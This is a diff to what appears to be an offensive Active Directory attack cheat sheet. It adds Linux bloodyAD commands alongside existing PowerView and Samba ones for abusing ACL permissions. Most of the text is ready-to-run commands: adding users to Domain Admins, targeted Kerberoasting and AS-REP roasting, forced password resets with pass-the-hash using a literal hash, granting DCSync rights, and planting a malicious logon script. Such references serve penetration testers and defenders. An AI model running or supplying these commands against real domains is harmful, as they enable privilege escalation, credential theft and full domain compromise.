@@ -2207,16 +2207,20 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 * **GenericAll on User** : We can reset user's password without knowing the current password
 * **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : 
 	* On Windows : `net group "domain admins" spotless /add /domain`
-	* On Linux using the Samba software suite : `net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'AttackerUser%MyPassword' -W DOMAIN -I [DC IP]`
+	* On Linux:
+		* using the Samba software suite : 
+		`net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'AttackerUser%MyPassword' -W DOMAIN -I [DC IP]`
+		* using bloodyAD: 
+		`bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword addObjectToGroup UserToAdd 'GROUP NAME'`
 
 * **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a TGS, then grab its hash and kerberoast it.
   ```powershell
   # Check for interesting permissions on accounts:
   Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
-  
+
   # Check if current user has already an SPN setted:
   PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
-  
+
   # Force set the SPN on the account: Targeted Kerberoasting
   PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
   PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
@@ -2230,21 +2234,32 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
   PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
   ```
 
-
 * **GenericAll/GenericWrite** : We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
-  ```powershell
-  # Modify the userAccountControl
-  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
-  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
+	* On Windows:
+	```powershell
+	# Modify the userAccountControl
+	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
+	PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
 
-  # Grab the ticket
-  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
-  ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
+	# Grab the ticket
+	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
+	ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
 
-  # Set back the userAccountControl
-  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
-  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
-  ```
+	# Set back the userAccountControl
+	PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
+	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
+	```
+	* On Linux:
+	```bash
+	# Modify the userAccountControl
+	$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user
+
+	# Grab the ticket
+	$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+	# Set back the userAccountControl
+	$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false
+	```
 
 
 #### GenericWrite
@@ -2263,6 +2278,9 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 		```bash
 		# Using rpcclient from the  Samba software suite
 		rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+		
+		# Using bloodyAD with pass-the-hash
+		bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
 		```
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
@@ -2288,14 +2306,23 @@ NOTE: To not alert the user the payload should hide its own process window and s
 
 To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
 
-* WriteDACL on Domain
-  ```powershell
-  # Give DCSync right to the principal identity
-  Import-Module .\PowerView.ps1
-  $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
-  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
-  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
-  ```
+* WriteDACL on Domain:
+	* On Windows: 
+	  ```powershell
+	  # Give DCSync right to the principal identity
+	  Import-Module .\PowerView.ps1
+	  $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
+	  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
+	  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+	  ```
+  	* On Linux:
+  	```bash
+	# Give DCSync right to the principal identity
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2
+	
+	# Remove right after DCSync
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2
+	```
   
 * WriteDACL on Group
   ```powershell
@@ -2338,12 +2365,20 @@ ConvertFrom-ADManagedPasswordBlob $mp
 
 #### ForceChangePassword
 
-An attacker can change the password of the user this ACE applies to. 
-This can be achieved with `Set-DomainUserPassword` (PowerView module).
-
+An attacker can change the password of the user this ACE applies to:
+* On Windows, this can be achieved with `Set-DomainUserPassword` (PowerView module):
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
+```
+
+* On Linux:
+```bash
+# Using rpcclient from the  Samba software suite
+rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+
+# Using bloodyAD with pass-the-hash
+bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
 ```
 
 
